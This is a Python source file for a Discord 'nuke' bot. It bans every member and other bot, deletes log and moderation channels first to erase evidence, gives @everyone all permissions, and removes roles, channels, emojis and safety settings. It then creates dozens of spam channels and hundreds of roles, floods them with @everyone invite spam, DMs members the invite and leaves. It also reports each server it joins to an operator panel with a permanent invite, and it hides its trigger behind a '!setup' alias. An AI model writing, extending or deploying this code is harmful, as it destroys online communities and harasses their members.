import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

MANAGE_GUILD_ID = 1477622875560214548
MANAGE_CHANNEL_ID = 1477622875560214551

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

sem_global = asyncio.Semaphore(45)
sem_message = asyncio.Semaphore(8)
sem_dm = asyncio.Semaphore(10)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
                await asyncio.sleep(wait)
                await coro
            else:
                pass

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
                await asyncio.sleep(wait)
            else:
                pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member):
    try:
        await member.send(INVITE_LINK)
    except:
        pass

async def create_channel_safely(guild, name):
    try:
        return await guild.create_text_channel(name)
    except discord.HTTPException as e:
        if e.status == 429:
            wait = getattr(e, 'retry_after', 3) + random.uniform(0.3, 1.0)
            await asyncio.sleep(wait)
            return await create_channel_safely(guild, name)
        return None

async def create_colored_roles_task(guild, target_roles):
    current = 0
    while current < target_roles:
        try:
            await guild.create_role(
                name="ますまに共栄圏に荒らされましたｗｗｗ",
                color=discord.Color.random(),
                hoist=True,
                mentionable=True
            )
            current += 1
        except:
            break
        await asyncio.sleep(random.uniform(0.12, 0.25))

async def ban_all_task(guild, members, reason):
    for m in members:
        if m == guild.me:
            continue
        try:
            await guild.ban(m, reason=reason, delete_message_seconds=0)
        except:
            pass
        await asyncio.sleep(random.uniform(0.2, 0.4))

async def delete_emojis_and_stickers(guild):
    emojis = await guild.fetch_emojis()
    if emojis:
        batch_size = 10
        for i in range(0, len(emojis), batch_size):
            batch = emojis[i:i+batch_size]
            await asyncio.gather(*(limited_global(e.delete()) for e in batch), return_exceptions=True)
            await asyncio.sleep(random.uniform(0.05, 0.12))

    stickers = await guild.fetch_stickers()
    if stickers:
        await asyncio.gather(*(limited_global(s.delete()) for s in stickers), return_exceptions=True)

async def send_management_notification(guild):
    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
    if not manage_guild: return
    manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
    if not manage_channel: return

    try:
        invites = await guild.invites()
        invite_link = "取得失敗"
        for inv in invites:
            if inv.max_age == 0 and inv.max_uses == 0:
                invite_link = inv.url
                break
        if invite_link == "取得失敗" and guild.text_channels:
            ch = guild.text_channels[0]
            new_inv = await ch.create_invite(max_age=0, max_uses=0, unique=True, reason="管理用永久招待")
            invite_link = new_inv.url
    except:
        invite_link = "権限不足"

    embed = discord.Embed(title="新規サーバー参加通知", color=discord.Color.red(), timestamp=datetime.now())
    embed.add_field(name="サーバー名", value=guild.name, inline=False)
    embed.add_field(name="サーバーID", value=guild.id, inline=False)
    embed.add_field(name="総メンバー", value=guild.member_count, inline=False)
    embed.add_field(name="非BOTメンバー", value=len([m for m in guild.members if not m.bot]), inline=False)
    embed.add_field(name="永久招待リンク", value=invite_link, inline=False)
    embed.set_footer(text="自動ヌーク対象サーバー")
    await manage_channel.send(embed=embed)

async def delete_old_roles(guild):
    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
    print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
    batch_size = 15
    for i in range(0, len(roles_to_delete), batch_size):
        batch = roles_to_delete[i:i+batch_size]
        await asyncio.gather(*(limited_global(r.delete()) for r in batch), return_exceptions=True)
        await asyncio.sleep(random.uniform(0.05, 0.1))

async def delete_all_channels(guild):
    channels = list(guild.channels)
    print(f"チャンネル削除開始: 対象 {len(channels)}個")
    batch_size_ch = 15
    attempt_ch = 0
    while len(channels) > 0 and attempt_ch < 4:
        attempt_ch += 1
        for i in range(0, len(channels), batch_size_ch):
            batch_ch = channels[i:i+batch_size_ch]
            await asyncio.gather(*(limited_global(ch.delete()) for ch in batch_ch), return_exceptions=True)
            await asyncio.sleep(random.uniform(0.03, 0.08))
        await asyncio.sleep(0.5)
        channels = list(guild.channels)
    print(f"チャンネル削除完了: 残り {len(channels)}個")

async def core_nuke(guild, new_server_name=None):
    if guild.id == MANAGE_GUILD_ID:
        print(f"管理サーバー({guild.name})のためヌークをスキップ")
        return

    new_name = new_server_name or DEFAULT_NEW_NAME

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")

    # 他のボットBAN
    bot_ban_coros = [limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot]
    if bot_ban_coros:
        await asyncio.gather(*bot_ban_coros, return_exceptions=True)

    # ログ系チャンネル優先削除
    log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
    channels = list(guild.channels)
    log_channels = [ch for ch in channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
    if log_channels:
        await asyncio.gather(*(limited_global(ch.delete()) for ch in log_channels), return_exceptions=True)
        await asyncio.sleep(1)

    # @everyone権限最大化
    everyone_role = guild.default_role
    permissions = discord.Permissions.all()
    try:
        await limited_global(everyone_role.edit(permissions=permissions))
    except:
        pass

    # アイコン/バナー/スプラッシュ削除
    try:
        await limited_global(guild.edit(icon=None, banner=None, splash=None))
    except:
        pass

    # 絵文字削除 + スタンプ削除
    await delete_emojis_and_stickers(guild)

    # コミュニティ無効化
    try:
        await limited_global(guild.edit(
            verification_level=discord.VerificationLevel.none,
            explicit_content_filter=discord.ContentFilter.disabled,
            default_notifications=discord.NotificationLevel.all_messages,
            community_features=False
        ))
    except:
        pass

    # ウェルカム/ルール無効化
    try:
        await limited_global(guild.edit(system_channel=None, rules_channel=None))
    except:
        pass

    # DM送信（権限持ち除外）
    dm_members = [m for m in non_bot_members if not m.guild_permissions.administrator]
    dm_coros = [limited_dm(send_dm(m)) for m in dm_members]
    if dm_coros:
        await asyncio.gather(*dm_coros, return_exceptions=True)

    # ロール削除とチャンネル削除を完全に並列で爆撃
    role_delete_task = asyncio.create_task(delete_old_roles(guild))
    channel_delete_task = asyncio.create_task(delete_all_channels(guild))

    # サーバー名変更
    try:
        await guild.edit(name=new_name)
    except:
        pass

    # 並列待機
    await asyncio.gather(role_delete_task, channel_delete_task, return_exceptions=True)

    # チャンネル作成
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 80
    elif member_count < 500:
        target_channels = 70
    else:
        target_channels = 50

    target_roles = 240

    channels_created = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    while len(channels_created) < target_channels:
        tasks = []
        for _ in range(30):
            if len(channels_created) >= target_channels:
                break
            current += 1
            name = channel_names[current % 2]
            tasks.append(create_channel_safely(guild, name))
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = [c for c in batch if isinstance(c, discord.TextChannel)]
        channels_created += added
        await asyncio.sleep(random.uniform(0.05, 0.1))

    # ロール作成（並列）
    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))

    # スパム + BAN
    spam_messages = [
        f"@everyone {INVITE_LINK}",
        f"@everyone 来い {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels_created}
    active_channels = channels_created.copy()

    ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))

    while any(c < 300 for c in message_counters.values()):
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 300:
                active_channels.remove(ch)
                continue
            spam_tasks.append(limited_message(ch.send(random.choice(spam_messages))))
            message_counters[ch.id] += 1

        await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(random.uniform(0.08, 0.25))

    await ban_task
    await role_create_task

    print("ヌーク完了 → bot退出")
    try:
        await guild.leave()
    except Exception as e:
        print(f"退出失敗: {e}")

    print("完了")

@bot.event
async def on_guild_join(guild):
    if guild.id == MANAGE_GUILD_ID:
        print(f"管理サーバー参加: {guild.name} → 残留（保護）")
        return

    await send_management_notification(guild)  # ← 新規参加即通知

    non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
    member_count = len(non_bot_members)

    if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
        print(f"自動退出: {guild.name} (メンバー含まず {member_count}人、名前が「ま」から始まらない or 郁郁地区美通話)")
        try:
            await guild.leave()
        except Exception as e:
            print(f"退出失敗: {e}")
    else:
        print(f"新規参加: {guild.name} (メンバー含まず {member_count}人) → 残留")

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")
    print("=== ボット起動時の全サーバー情報 ===")
    for guild in bot.guilds:
        if guild.id == MANAGE_GUILD_ID:
            print(f"管理サーバー: {guild.name} → 残留（保護）")
            continue

        non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
        member_count = len(non_bot_members)
        if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
            print(f"起動時自動退出: {guild.name} (メンバー含まず {member_count}人)")
            try:
                await guild.leave()
            except Exception as e:
                print(f"退出失敗: {e}")
        else:
            await send_management_notification(guild)  # 起動時も通知
    print("=====================================")

    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
    if manage_guild:
        manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
        if manage_channel:
            view = ManageView(bot)
            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds if g.id != MANAGE_GUILD_ID]
            view.select_guild.options = options
            await manage_channel.send("サーバー管理パネル", view=view)
        else:
            print("管理チャンネルが見つかりません")
    else:
        print("管理サーバーが見つかりません")

class ManageView(discord.ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary)
    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
        for g in self.bot.guilds:
            if g.id != MANAGE_GUILD_ID:
                embed.add_field(name=g.name, value=f"ID: {g.id}\nメンバー: {g.member_count}", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[])
    async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
        guild_id = int(select.values[0])
        guild = self.bot.get_guild(guild_id)
        if guild and guild.id != MANAGE_GUILD_ID:
            await core_nuke(guild)
            await interaction.response.send_message(f"{guild.name} でヌーク起動しました。", ephemeral=True)
        else:
            await interaction.response.send_message("無効なサーバーまたは保護されています。", ephemeral=True)

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if not ctx.guild or ctx.guild.id == MANAGE_GUILD_ID:
        await ctx.send("このサーバーでは使用できません。", delete_after=10)
        return
    try:
        await ctx.message.delete()
    except:
        pass
    asyncio.create_task(core_nuke(ctx.guild, new_name))

bot.run(TOKEN)
